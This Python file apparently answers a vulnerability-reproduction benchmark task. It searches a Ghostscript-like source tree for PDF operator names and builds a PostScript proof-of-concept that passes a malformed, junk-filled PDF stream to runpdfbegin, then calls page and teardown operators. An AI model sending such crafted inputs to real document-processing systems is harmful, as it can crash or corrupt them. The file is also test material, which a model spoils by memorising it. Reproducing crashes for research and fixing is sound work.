import os
import re
import tarfile
from typing import Iterable, Optional, Set, Tuple


class Solution:
    def _iter_files_from_dir(self, root: str) -> Iterable[Tuple[str, bytes]]:
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                path = os.path.join(dirpath, fn)
                try:
                    with open(path, "rb") as f:
                        yield path, f.read()
                except Exception:
                    continue

    def _iter_files_from_tar(self, tar_path: str) -> Iterable[Tuple[str, bytes]]:
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name
                    if m.size > 8 * 1024 * 1024:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                        yield name, data
                    except Exception:
                        continue
        except Exception:
            return

    def _iter_source_files(self, src_path: str) -> Iterable[Tuple[str, bytes]]:
        if os.path.isdir(src_path):
            yield from self._iter_files_from_dir(src_path)
        else:
            yield from self._iter_files_from_tar(src_path)

    def _find_ps_defined_names(self, src_path: str, wanted: Set[str]) -> Set[str]:
        found: Set[str] = set()
        if not wanted:
            return found

        pats = {n: re.compile(rb"(?m)^\s*/" + re.escape(n.encode("ascii", "ignore")) + rb"\b") for n in wanted}

        for path, data in self._iter_source_files(src_path):
            if not path.lower().endswith(".ps"):
                continue
            for n, pat in pats.items():
                if n in found:
                    continue
                try:
                    if pat.search(data) is not None:
                        found.add(n)
                except Exception:
                    continue
            if found == wanted:
                break
        return found

    def _find_c_operator_names(self, src_path: str, wanted: Set[str]) -> Set[str]:
        found: Set[str] = set()
        if not wanted:
            return found

        # Look for quoted operator names in op_def tables like {"1.runpdfbegin", ...}
        # We check for the name occurring after leading digits and optional whitespace.
        pats = {
            n: re.compile(rb'"[0-9]+\s*' + re.escape(n.encode("ascii", "ignore")) + rb'"')
            for n in wanted
        }

        for path, data in self._iter_source_files(src_path):
            low = path.lower()
            if not (low.endswith(".c") or low.endswith(".h")):
                continue
            for n, pat in pats.items():
                if n in found:
                    continue
                try:
                    if pat.search(data) is not None:
                        found.add(n)
                except Exception:
                    continue
            if found == wanted:
                break
        return found

    def _pick_name(self, candidates: Iterable[str], available: Set[str]) -> Optional[str]:
        for n in candidates:
            if n in available:
                return n
        return None

    def solve(self, src_path: str) -> bytes:
        begin_candidates = ["runpdfbegin", ".runpdfbegin"]
        end_candidates = ["runpdfend", ".runpdfend"]

        action_candidates = [
            "pdfshowpage",
            "pdfpagecount",
            "pdfgetpage",
            "pdfinfo",
            "pdffirstpage",
            "pdfnextpage",
        ]

        wanted_ps = set(begin_candidates + end_candidates + action_candidates)
        ps_defined = self._find_ps_defined_names(src_path, wanted_ps)

        # If not found in PS init files, try C operator tables for dotted/internal operators.
        wanted_c = set(n for n in begin_candidates + end_candidates if n.startswith("."))
        c_defined = self._find_c_operator_names(src_path, wanted_c)

        available = set(ps_defined) | set(c_defined)

        begin_name = self._pick_name(begin_candidates, available) or "runpdfbegin"
        end_name = self._pick_name(end_candidates, available) or "runpdfend"

        actions = []
        for a in action_candidates:
            if a in available:
                actions.append(a)

        # Build actions with conservative stack handling.
        action_lines = []
        if "pdfshowpage" in actions:
            action_lines.append("{ 1 pdfshowpage } stopped pop clear")
        if "pdfpagecount" in actions:
            action_lines.append("{ pdfpagecount } stopped pop clear")
        if "pdfgetpage" in actions:
            action_lines.append("{ 1 pdfgetpage } stopped pop clear")
        if "pdfinfo" in actions:
            action_lines.append("{ pdfinfo } stopped pop clear")
        if "pdffirstpage" in actions:
            action_lines.append("{ pdffirstpage } stopped pop clear")
        if "pdfnextpage" in actions:
            action_lines.append("{ pdfnextpage } stopped pop clear")

        # Always attempt end last
        action_lines.append("{ " + end_name + " } stopped pop clear")

        ps = []
        ps.append("%!PS")
        ps.append("/S currentfile << /EODString (%%EOF) >> /SubFileDecode filter def")
        ps.append("{ S " + begin_name + " } stopped")
        # Stream data starts immediately after 'stopped' token above.
        ps.append("%PDF-1.4")
        ps.append("%AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
        ps.append("%BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB")
        ps.append("%%EOF")
        ps.append("pop clear")
        ps.extend(action_lines)
        ps.append("quit")
        ps.append("")

        return ("\n".join(ps)).encode("ascii", "ignore")